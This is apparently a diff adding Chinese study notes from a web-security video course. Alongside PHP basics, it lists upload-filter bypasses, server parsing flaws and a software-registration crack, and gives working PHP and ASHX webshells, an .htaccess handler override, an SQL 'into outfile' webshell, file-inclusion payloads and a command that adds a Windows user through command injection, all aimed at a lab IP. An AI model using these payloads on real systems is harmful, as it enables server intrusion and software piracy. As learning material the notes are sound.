@@ -1,0 +1,560 @@
+一 .你获取网络安全知识途径有哪些？
+
+1.网站，看雪，安全焦点，国内的乌云，FreeBuf
+
+2.视频学习：i春秋，51cto，慕课网，实验楼，实验吧，网易云课堂等等
+
+3.微信公众号、知乎等，企业src等
+
+4.书籍，《白帽子讲web安全》《Web应用安全权威指南》等
+
+5.然后就是请教牛人
+
+6.最后是公司内技术分享。
+
+
+
+课程：
+
+课程地址：https://www.bilibili.com/video/BV1FJ411e7kZ?p=53
+上下两部，一共100多课程，。自行学习
+ php基础
+ Owasp top 10
+ 实战
+ 进阶APT
+ Python 多线程、验证码识别
+ JS -> ajax(原生态）-> jquery -> ajax -> 触发器
+ 
+ ##第一节：
+ #######
+ 破解软件注册时：
+ 利用抓包工具找到运行的要破解的软件进程，使用随意注册码激活软件，找到抓包工具中的send 请求
+ 点击暂停send请求，查看send请求内容，找到send的域名，将此域名添加到hosts文件，解析为本机IP地址，127.0.0.1
+ 保存hosts文件，设置hosts可读写权限。注册成功。
+ 
+ 
+ ##第二节
+ ######
+ 抓包burpsuite工具，如何更改，百度搜索 上传截断。
+ 1）filename="php.jpg%00.php" 		#%00 结束直接右键url编码
+ 2） 或者filename = "php.jpg .php" 之后再hex编码中找到jpg的16位编码改成00 即可。与上例意思一致
+ 
+ 
+ 第8节
+ 类型：
+ 1. 字符串
+ 2. 整形
+ 3. 浮点型
+ 4. 逻辑
+ 5. 数组
+ 6. 对象
+ 7. null
+ 
+ 
+ 
+ define（） 函数定义常量，define（NAME, '1',true)  	默认第三个形参是代表对大小写不敏感，默认false.
+ echo（）,普通输出
+ print_r()	友好输出
+ var_dump()	 更详尽的类型输出
+ 
+ php
+  函数：
+  function functionname() {
+  //执行代码
+  }
+  
+  函数名以字母或者下划线开始（非数字）
+  函数名对大小写不敏感。
+  函数名能反映函数执行的任务。
+ ####静态变量 
+ fuction demo(){
+ static $i=1;
+ }
+	函数执行完后，变量值仍然保存
+	修饰属性或者方法，可通过类名访问。如果修饰的是类的属性，保留值
+ 
+ foreach($array as $key => $value)
+ {
+	echo $key,$value;
+ }
+ foreach 原理：
+	1.第一次进入foreach ,找到array的内存地址
+	2. 找到当前数组第一个元素取出来，指针下移
+	3. 将键值赋值给key变量，值赋值给value
+	4.循环执行
+ each() : 	没有循环的指针，foreach的拆分项，只输出一个结果，
+ 混合数组，既有下标也有字符串
+ 
+ 
+ sublime:类似notepad++
+ 
+ 
+#####写入文件
+ <?php
+$txt = $_POST['name'];
+$f = fopen('11.txt','a+');
+fwrite($f,$txt);
+fclose($f)
+?>
+ 
+ 
+ 第36课时：
+ 
+ 注意字符串截断： 字符串类型和int相加时 ，会判断数字类型，再相加，其余字符串转义
+ 
+ 
+ 
+###No45. CDN 内容分发网络  content dilivery/distribute network.
+1. cdn 怎样减轻源站服务器压力：
+	CDN能处理整个网站页面70% ~ 90% 的内容访问量 ，从而解决了网站的并发量，由此减轻了源服务器的访问压力，
+	同时提升了网站性能，可扩展性及安全性
+	
+2. CDN加速如何实现：
+	将网站原服务器中的内容存储到分布于各地的缓存服务器（cache server）中（即cdn节点） ， 通过智能的中心管理系统对网络的动态
+	流量进行分配控制， 使用户能以最快速从最接近用户的地方获取所需要的信息，一般的静态数据，如图片、多媒体材料deng
+	将基本从CDN节点上读取，这使得从源文件服务器上读取的数据量大大减少，从而提高用户访问的响应速度和服务器的可用性，
+	解决internet 网络的拥塞状况，提高用户访问网站的响应速度
+	
+	
+###防火墙
+1. CDN
+	返回延时界面
+2. 硬件防火墙
+	硬件设备的设置，lan ，wan
+3. 软件防火墙
+	自带的防火墙
+	
+	selectselect 过滤后变成select
+4. 程序防火墙
+	e.g.：
+		php写的过滤程式。
+		
+###JS
+添加动态效果
+	百度搜索时候出现的那个下拉菜单 提示访问内容 就是JS效果
+
+###ajax
+	快速创建动态效果
+	网页异步更新 ： 不加载全部网页，只对部分网页更新。
+	
+ajax 测试
+网页控制台输入：
+function xlxl(){
+	if(window.navigator.userAgent.indexOf('MSIE') >0){
+		return new ActiveXObject('Microsoft.SMLHTTP');
+	}else {  // 如果不是，则是其他类型浏览器。
+		return new XMLHttpRequest();
+	}
+}
+//判断对方用什么浏览器
+var xd= xlxl();
+// 生成参数 对应post请求
+var data='c=xiaoxiaoxiao';
+
+// 生成url ，本地文件地址。
+var url='test02.php';
+//初始化
+xd.open("post",url);
+//设置请求头
+xd.setRequestHeader('content-type','application/x-www-form-urlencoded');
+//ajax对象状态码改变时自动执行回调函数
+xd.onreadystatechange =function(){
+	//Ajax对象的状态码是4（数据接受完毕）
+	if(xd.readyState == 4 && xd.status ==200){
+		
+		alert(xd.responseText);
+	}
+	
+}
+
+// 发送请求
+xd.send(data);
+
+#################
+	<script src="http://10.148.52.202/1.js></script>
+	
+##webshell
+
+test.php,post data 就是了。
+#test.php
+<?php
+
+eval($_GET['id']);
+
+?>
+e.g.：
+
+http://10.148.52.202/test.php?id=echo%20system(%22dir%22);
+
+
+
+#############空字节截断
+
+空字节，%00 这类。使用上传截断 .asp%00.jpg  截断成.asp 类型就可以上传了。
+#test.php
+<?php
+
+$i= $_GET['id'];
+echo $i;
+
+?>
+e.g.:
+10.148.52.202/test.php?id= 222222%003333
+
+#百度搜索关键字 “上传 截断。”
+e.g.：
+https://blog.csdn.net/hitwangpeng/article/details/47042971
+https://www.cnblogs.com/Oran9e/p/6120388.html
+https://www.cnblogs.com/Jdrops/p/5374919.html
+
+############文件上传
+1. 图片是否正常上传
+2.图片上传内容是否被感染 ， 例如图片内容含有php代码，打开截图后， 原图片与截图图片是不同内容，不含php代码
+3. 上传域名是否是目标服务器
+如果不是，那么判断图片服务器是否解析（php，asp,aspx,jsp,shtml,cfm）
+
+4. 上传目录是否支持解析（php,asp,aspx,jsp,cfm,shtml）
+
+#########文件上传空字节。空字节
+
+1）黑名单上传截断：
+e.g.：
+https://blog.csdn.net/qq_25899635/article/details/90344198
+
+2）白名单上传。
+
+
+3）有些环境可以尝试上传php3，php4,php5,phtml或者使用服务器解析漏洞。
+
+
+########二次上传。
+上传两次一个shell脚本。
+系统自动更改名字为“副本”
+e.g.：fckeditor 二次上传
+百度搜索“fckeditor 二次上传”
+
+
+
+#####mime类型
+
+对应owasp 中档危险程度，抓包更改类型解决。
+
+
+######IIS解析漏洞 版本iis5.x-6.x ，大多为windows2003 ，语句一般是asp的，不能解析aspx。
+
+百度搜索关键字 “IIS 解析漏洞”
+目录解析 xx.asp/xx.jpg
+原理： 服务器默认将.asp,.asa 目录下的文件都解析成asp文件。
+
+文件解析：xx.asp;.jpg
+原理： 服务器默认不解析;后面的内容，因此xx.asp;.jpg 被解析成 asp文件。
+
+解析文件类型：IIS6.0 默认可以执行文件除了asp还有
+/test.asa
+/test.cer
+/test.cdx
+后缀。
+
+
+##########Apache解析漏洞
+1.php.xxx2.xx3  从右边开始解析，不认识xx3 ，抛弃了，知道.php 
+
+
+#####nginx 解析漏洞”
+上传一句话。
+php.exe/.php  -> php.php  解析成。
+/img/23142231.jpg/.php  会解析成.php，将xxx.jpg解析成.php。
+e.g.:
+http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0210602   类似、。
+
+
+####IIS7.5 漏洞 
+与 nginx类似。
+是php配置文件中开启了 cgi.fix_pathinfo , 这不是两者本身漏洞。
+名称： a.aspx.a;.a.aspx.jpg..jpg -》解析成 a.aspx
+
+
+百度IIS7.5 漏洞。
+.e.g.：
+https://blog.csdn.net/nzjdsds/article/details/81367930
+
+
+#####。net上传
+一般aspx默认支持ashx
+ashx
+代码如下：
+<%@ WebHandler Language='C#'Class='Handler' %>
+using System;
+using System.Web;
+using System.IO;
+public class Handler:IHttpHandler{
+public void ProcessRequest(HttpContext context){
+context.Response.ContentType='text/plain';
+
+StreamWritter file1 = File.CreateText(context.Server.MapPath('root.asp'));
+file1.Write("<%response.clear.excute request(\"root\"):response.End%>")
+file1.Flush();
+file1.Close();
+}
+public bool IsReusable{
+get{
+return flase;
+}
+}
+}
+#########phtml上传。
+
+在apache的httpd.conf 添加
+AddType application/x-httpd-php .phtml
+这样phtml后缀文件会按照php去解析。也可以使用其他后缀。
+
+
+#######.htaccess 文件上传
+windows命名.htaccess 文件，直接建立回报无档名，到notepad++ 中重新命名为.htaccess  即可。
+
+<Files *.jpg>
+ForceType application/x-httpd-php
+SetHandler application/x-httpd-php
+</Files>
+
+#当前目录下所有*.jpg 按照php来解析
+e.g.: 所有txt结尾的按照php解析
+<Files *.txt>
+ForceType application/x-httpd-php
+SetHandler application/x-httpd-php
+</Files>
+网页访问：http://10.148.52.202/1.txt
+#1.txt内容
+<?php
+phpinfo();
+?>
+返回phpinfo界面。
+
+
+##############双文件上传。
+1.jpg
+1.jpg.php
+两个都可以上传，因为有些服务器验证完.jpg 后认为是合法的而忽略了.jpg后面的内容。
+
+
+
+###########找已知上传漏洞
+百度搜索 ， 根据版本号，类型 直接搜
+e.g.: 搜索fck 编辑器漏洞
+
+
+
+
+
+
+###########SQL注入
+导出数据库
+
+select '<?php eval()$_POST[cmd]) ?>'  into outfile  /etc/ky.txt
+
+show variables like "skip_name_resolve%";   #OFF
+
+mid(str,1,3)  截取字符
+
+ord()
+length()
+version()
+database()
+user()
+hex()
+unhex()
+load_file()
+
+参考网页：
+http://ceye.io/payloads	 邮箱、99~
+
+
+阿里云，redis，promethus，kafka，tomcat。 原理与实践。
+
+############## 文件包含。
+#1.php
+<?php
+
+	
+$f = empty($_GET['f'])? "":$_GET['f'];
+if($f){
+	include_once $f;
+	
+}else{
+	include_once './1.html';
+}
+	
+?>
+#1.txt
+<?php
+phpinfo();
+?>
+
+例如1.php文件包含11.txt文件，，直接访问http://10.148.52.202/1.php?f=d:11.txt   后，页面是phpinfo()界面，
+因为1.txt 包含在<?php $f?> 中，所以解析为php语言。
+
+详情参考 百度搜索“包含 截断”
+
+
+#####利用php协议包含。
+参考网页：https://www.cnblogs.com/luguoshuai/p/9124225.html   了解协议之间不同
+
+FTP： http file 协议
+http: 超文本传输协议
+file协议： 本地文件传输协议。  打开网页 ，输入file:///d:/11.txt  ，显示的是d盘下的文件内容。
+php 协议： 输入/输出流
+e.g.:
+$file_in=file_get_contents("php://input");
+开启php协议必须要 allow_url_include && allow_url_fopen 为On 才可以。
+#####自行测试未通过，开启两个参数post数据，没反应。待解决
+参考网页：
+https://www.cnblogs.com/demonxian3/p/9803409.html
+################data 协议
+GET请求访问，得到info（）界面
+http://10.148.52.202/1.php?f=data:text/palin,<?php echo phpinfo();?>
+
+POST请求依旧无效。
+#64进制转码输出文件内容。
+http://10.148.52.202/1.php?f=php://filter/convert.base64-encode/resource=./info.php
+
+###########防范措施
+1. 过滤/\. 等字符
+2.白名单验证，（只能包含当前目录下文件）
+3.不让客户端控制文件包含地址。
+
+#######配合函数
+exec()
+###
+<?php
+
+	
+$a = exec("dir");
+var_dump($a);
+
+	
+?>
+###
+system()
+popen()
+passthru()
+proc_open()
+pcntl_exec()
+shell_exec()
+反引号"``" 其实是使用shell_exec()函数。
+e.g.:
+#
+<?php
+
+	
+echo `ipconfig`;
+?>
+#
+  访问 http://10.148.52.202/1.php 可以看到ipconfig详情
+#添加用户。
+http://10.148.52.202/1.php?a=system&b=net user a a /add
+
+######还是文件包含。
+<?php
+$id=$_GET['id'];
+
+eval("echo $id;");
+?>
+#1.php
+访问：
+http://10.148.52.202/1.php?id=1123;phpinfo();
+
+#############
+
+
+##############序列化与反序列化。
+参考网页：https://www.freebuf.com/vuls/152058.html
+<?php
+$arr= array("name"=> "xindong","nianling"=>21,"wenhua"=>"xiaoxue");
+$arr2= serialize($arr); //转换字符串，序列化。
+						//反序列化，字符串转为数组。
+
+$arr3=unserialize($arr2);
+					
+var_dump( $arr3);
+?>
+
+
+#####1.php php版本不同，输出不同。此处版本5.4.45
+<?php
+header('Content-type:text/html;charset=utf-8');
+class myClass{
+	public $name;
+	function __construct($name){
+		$this -> name =$name;
+		echo "我叫".$this-> name."<hr />";
+	}
+	public function demo(){
+		echo 2;
+	}
+	public function __call($function_name,$args){
+		echo "您调用了不存在的方法$function_name<br />";
+		echo "传递的参数是： ";
+				var_dump($args);
+				
+	}
+}
+
+$a = new myClass("xindong");
+$a->demo();
+$a-> __call();
+exit;
+
+$content=@unserialize($_GET['id']);
+#判断是否是对象，如果是就调用方法
+if(is_object($content)){
+	$content ->ddd($content ->name);
+}
+?>
+###this -> name 是属性，相当于python中的this.name,$a->demo();是调用方法，相当于Python中a.demo()
+### __construct() 是基本方法，__call() 是异常处理方法，相当于python 中expect 。所以调用$a->__call()后 
+###显示是调用空方法，而调用$a->kksk()，因为函数kksk()不存在，所以默认异常调用__call()方法。
+##访问http://10.148.52.202/1.php
+
+
+################## freebuf 上搜索“无限安全” “硬件安全” “web安全” “代码审计” “进制”
+精通php。了解php漏洞。
+例如1.php
+<?php 
+echo preg_replace("/aaaaddds/e",$_GET['h'],"jutst aaaaaaddds");
+
+?>
+#原理，/e 修正符使得preg_replace()将replacement参数当做php代码，在适当逆向引用后。提示： 要确保replacement是一个
+合法的php字符串，否则php报告在preg_replace()的行中会出现语法解析错误。百度详细了解。
+###第一个参数是查找关键字，支持正则表达
+#第二个参数是替换成什么内容
+#第三个是被匹配的字符，。
+
+
+
+
+
+#################
+黑盒：什么都不给
+白盒：给源码
+exp：发送用于攻击数据包
+payloads：验证漏洞或者发送攻击数据包
+poc：验证漏洞，不给方法
+e.g.: 搜索dede exp。
+https://blog.51cto.com/0daysec/1571372
+
+
+
+
+
+#############找漏洞 
+乌云库
+提现漏洞： 1000 - （-1000） =2000 ，提现时提取负数，会增加账户金钱
+
+验证码漏洞：
+验证码输入，没有刷新，一直弹窗错误输出
+
+未授权访问：参考
+http://wooyun.2xss.cc/searchbug.php?q=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE
+
+wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo
+iOpP3aoSi?oB
